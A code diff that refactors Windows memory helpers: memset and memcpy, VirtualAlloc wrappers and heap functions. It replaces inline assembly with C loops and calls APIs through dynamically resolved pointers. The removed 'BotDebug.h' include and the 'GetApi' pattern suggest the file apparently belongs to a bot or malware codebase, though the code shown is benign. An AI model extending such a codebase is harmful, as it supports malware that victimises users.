@@ -1,45 +1,32 @@
-#include <windows.h>
-
 #include "Memory.h"
 #include "GetApi.h"
-#include "ntdll.h"
 
-//#include "BotDebug.h"
 
-void *m_memset( void *szBuffer, DWORD dwSym, DWORD dwLen )
+
+void m_memset(const void* Buffer, BYTE Sym, size_t Len)
 {
-	if ( !szBuffer )
-		return NULL;
-
-	__asm
+	if (Buffer)
 	{
-		pushad
-		mov		edi,[szBuffer]
-		mov		ecx,[dwLen]
-		mov		eax,[dwSym]
-		rep		stosb
-		popad
-	} 
+		volatile char *Tmp = (volatile char *)Buffer;
+		while (Len)
+		{
+			*Tmp = Sym;
+			Len--;
+			Tmp++;
+		}
+	}
 
-	return NULL;
 } 
 
 void *m_memcpy( void *szBuf, const void *szStr, int nLen )
 {
-	if ( !szBuf || !szStr || nLen <= 0 )
-		return NULL;
-
-	__asm
+	if (szBuf && szStr && nLen > 0)
 	{
-		pushad
-		mov		esi,[szStr]
-		mov		edi,[szBuf]
-		mov		ecx,[nLen]
-		rep		movsb
-		popad
+		LPBYTE Buf = (LPBYTE)szBuf;
+		LPBYTE Str = (LPBYTE)szStr;
+		for (; nLen > 0; nLen--, Buf++, Str++) *Buf = *Str;
 	}
-
-	return NULL;
+	return szBuf;
 }
 
 
@@ -101,11 +88,8 @@ void* m_memmem( const void* mem1, int szMem1, const void* mem2, int szMem2 )
 
 DWORD GetMemSize( LPVOID lpAddr )
 {
-	if ( !lpAddr )
-	{
-		return 0;
-	}
-
+	if (!lpAddr) return 0;
+		
 	MEMORY_BASIC_INFORMATION MemInfo;
 
 	pVirtualQuery( lpAddr, &MemInfo, sizeof( MEMORY_BASIC_INFORMATION ) );
@@ -116,7 +100,7 @@ DWORD GetMemSize( LPVOID lpAddr )
 
 VOID MemFree( LPVOID lpAddr )
 {
-	if ( lpAddr != NULL )
+	if (lpAddr)
 		pVirtualFree( lpAddr, 0, MEM_RELEASE );
 }
 
@@ -126,28 +110,12 @@ LPVOID MemAlloc( DWORD dwSize )
 	return pVirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 }
 
-LPVOID MemAllocAndClear(DWORD Size)
+LPVOID MemAllocAndClear(size_t Size)
 {
 	// Выделить и очистить память указанного размера
-	if (Size == 0)
-    	return NULL;
-
-	void* Memory = pVirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (Size == 0) return NULL;
+	LPVOID Memory = pVirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	m_memset(Memory, 0, Size);
-
-	//if (Memory != NULL)
-	//{
- //   	DWORD Symbol = 0;
-	//	__asm
-	//	{
-	//		pushad
-	//		mov		edi, [Memory]
-	//		mov		ecx, [Size]
-	//		mov		eax, [Symbol]
-	//		rep		stosb
-	//		popad
-	//	}
- //   }
 
 	return Memory;
 }
@@ -189,13 +157,8 @@ LPVOID HEAP::Alloc(DWORD Size)
 {
 	if (Size == 0) return NULL;
 
-	LPVOID Buf = 0;
-	HANDLE Heap = pGetProcessHeap();
-	if (Heap != NULL)
-	{
-		Buf = pHeapAlloc(Heap, 0, Size);
-        m_memset(Buf, 0, Size);
-    }
+	LPVOID Buf = pHeapAlloc((HANDLE)pGetProcessHeap(), 0, Size);
+    m_memset(Buf, 0, Size);
 	return Buf;
 }
 
@@ -251,17 +214,8 @@ void HEAP::Free2(LPVOID &Buf)
 
 DWORD HEAP::Size(LPVOID Buf)
 {
-	if (Buf == NULL) return 0;
+	if (!Buf) return 0;
 
-	HANDLE Heap = pGetProcessHeap();
-
-	if (Heap != NULL)
-	{
-		int S = (int)pHeapSize(Heap, 0, Buf);
-		if (S < 0) S = 0;
-        return S;
-	}
-	else
-		return 0;
+	return (int)pHeapSize((HANDLE)pGetProcessHeap(), 0, Buf);
 }
 
